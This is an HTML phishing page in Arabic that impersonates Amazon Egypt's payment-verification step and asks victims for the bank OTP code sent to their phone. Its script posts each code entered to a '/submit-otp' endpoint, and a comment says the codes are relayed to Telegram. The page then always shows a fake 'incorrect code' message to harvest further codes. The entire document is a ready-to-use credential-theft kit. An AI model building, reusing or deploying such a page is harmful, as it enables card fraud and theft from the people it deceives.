<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>التحقق من الدفع - أمازون</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: 'Cairo', sans-serif; background-color: #eaeded; -webkit-tap-highlight-color: transparent; display: flex; flex-direction: column; min-height: 100vh; }
        .amazon-btn { background: linear-gradient(to bottom, #f7dfa5, #f0c14b); border: 1px solid; border-color: #a88734 #9c7e31 #846a29; border-radius: 8px; color: #111; }
        .amazon-btn:active { background: #f0c14b; box-shadow: inset 0 1px 2px rgba(0,0,0,0.2); }
        .otp-input:focus { border-color: #e77600; box-shadow: 0 0 0 2px rgba(231,118,0,0.2); outline: none; }
        .timer-ring { transition: stroke-dashoffset 1s linear; }
    </style>
</head>
<body class="text-[#0F1111]">

    <header class="bg-[#131921] text-white px-4 py-2.5 flex items-center justify-between shadow-sm sticky top-0 z-50">
        <div class="flex items-center gap-1.5">
            <span class="text-[22px] font-bold tracking-tighter">amazon<span class="text-[#FF9900]">.eg</span></span>
        </div>
    </header>

    <main class="flex-grow flex flex-col px-3 py-6 w-full max-w-md mx-auto">
        
        <div class="bg-white p-5 rounded-lg shadow-sm border border-gray-200 w-full text-center">
            
            <!-- المبلغ -->
            <div class="inline-flex items-center gap-1 bg-[#131921] text-white px-4 py-1.5 rounded-full text-xs font-bold mb-4 shadow-sm">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
                إجمالي المطلوب: 43.00 ج.م
            </div>

            <h1 class="text-lg font-bold mb-1">التحقق بخطوتين</h1>
            <p class="text-xs text-gray-500 mb-5 leading-relaxed">تم إرسال رمز تحقق (OTP) إلى رقم هاتفك المرتبط بحسابك البنكي لتأكيد العملية.</p>

            <!-- رسالة الخطأ (مخفية في البداية) -->
            <div id="errorMessage" class="hidden bg-red-50 border border-red-200 text-red-700 text-xs rounded-md p-2.5 mb-4 text-center">
                ⚠️ الرمز الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى.
            </div>

            <form id="otpForm" class="space-y-4">
                
                <!-- العداد الدائري -->
                <div class="relative w-16 h-16 mx-auto mb-2">
                    <svg width="64" height="64" viewBox="0 0 64 64" class="transform -rotate-90">
                        <circle cx="32" cy="32" r="28" fill="none" stroke="#E5E7EB" stroke-width="4"/>
                        <circle id="timerCircle" cx="32" cy="32" r="28" fill="none" stroke="#FF9900" stroke-width="4" stroke-linecap="round" stroke-dasharray="175.93" stroke-dashoffset="0"/>
                    </svg>
                    <div id="timerDisplay" class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 text-sm font-bold text-[#0F1111]">60</div>
                </div>

                <div>
                    <input type="tel" name="otp_code" id="otpInput" required maxlength="6" placeholder="• • • • • •" class="otp-input w-full p-3 border border-gray-300 rounded-md text-center text-lg tracking-[0.5em] font-bold" dir="ltr" autofocus>
                </div>

                <button type="submit" class="w-full amazon-btn py-2.5 font-bold text-sm shadow-sm">
                    تأكيد الدفع
                </button>
            </form>

            <div class="mt-4">
                <button id="resendBtn" class="text-[11px] text-[#007185] hover:text-[#C7511F] hover:underline disabled:text-gray-400 disabled:no-underline" disabled>
                    إعادة إرسال الرمز خلال <span id="resendTimer">60</span> ثانية
                </button>
            </div>

            <div class="mt-4 pt-3 border-t border-gray-100 flex items-center justify-center gap-3 text-[9px] text-gray-400">
                <span class="flex items-center gap-1"><svg class="w-3 h-3 text-green-600" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/></svg> تشفير 256 بت</span>
                <span class="flex items-center gap-1"><svg class="w-3 h-3 text-green-600" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg> حماية المشتري</span>
            </div>
        </div>
    </main>

    <footer class="bg-[#37475A] text-white py-2 text-center text-[10px] w-full">
        <p>&copy; 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </footer>

    <script>
        // دالة المؤقت
        (function() {
            const TIMER_DURATION = 60;
            let timeLeft = TIMER_DURATION;
            let timerInterval = null;
            
            const timerDisplay = document.getElementById('timerDisplay');
            const timerCircle = document.getElementById('timerCircle');
            const resendBtn = document.getElementById('resendBtn');
            const resendTimer = document.getElementById('resendTimer');
            const circumference = 2 * Math.PI * 28;

            function updateTimer() {
                timerDisplay.textContent = timeLeft;
                if(resendTimer) resendTimer.textContent = timeLeft;
                
                const progress = timeLeft / TIMER_DURATION;
                const offset = circumference * (1 - progress);
                timerCircle.style.strokeDashoffset = offset;

                if (timeLeft <= 10) {
                    timerCircle.style.stroke = '#dc2626';
                    timerDisplay.classList.add('text-red-600');
                } else {
                    timerCircle.style.stroke = '#FF9900';
                    timerDisplay.classList.remove('text-red-600');
                }

                if (timeLeft <= 0) {
                    resendBtn.disabled = false;
                    resendBtn.innerHTML = 'إعادة إرسال رمز جديد';
                } else {
                    resendBtn.disabled = true;
                    resendBtn.innerHTML = `إعادة إرسال الرمز خلال <span id="resendTimer">${timeLeft}</span> ثانية`;
                }
            }

            function startTimer() {
                if (timerInterval) clearInterval(timerInterval);
                timeLeft = TIMER_DURATION;
                updateTimer();
                
                timerInterval = setInterval(() => {
                    timeLeft--;
                    updateTimer();
                    if (timeLeft <= 0) clearInterval(timerInterval);
                }, 1000);
            }

            resendBtn.addEventListener('click', () => {
                startTimer();
            });

            startTimer();
        })();

        // التعامل مع إرسال الفورم
        document.getElementById('otpForm').addEventListener('submit', async function(e) {
            e.preventDefault(); // منع الإرسال التقليدي
            
            const otpCode = document.getElementById('otpInput').value;
            const errorMessage = document.getElementById('errorMessage');
            
            if (otpCode.length < 4) {
                alert('يرجى إدخال رمز صحيح');
                return;
            }

            // إرسال البيانات للسيرفر (عشان تيجي على تليجرام)
            try {
                await fetch('/submit-otp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ otp_code: otpCode })
                });
            } catch (err) {
                console.error('خطأ:', err);
            }

            // إظهار رسالة الخطأ
            errorMessage.classList.remove('hidden');
            
            // مسح الحقل عشان يكتب تاني
            document.getElementById('otpInput').value = '';
        });
    </script>
</body>
</html>
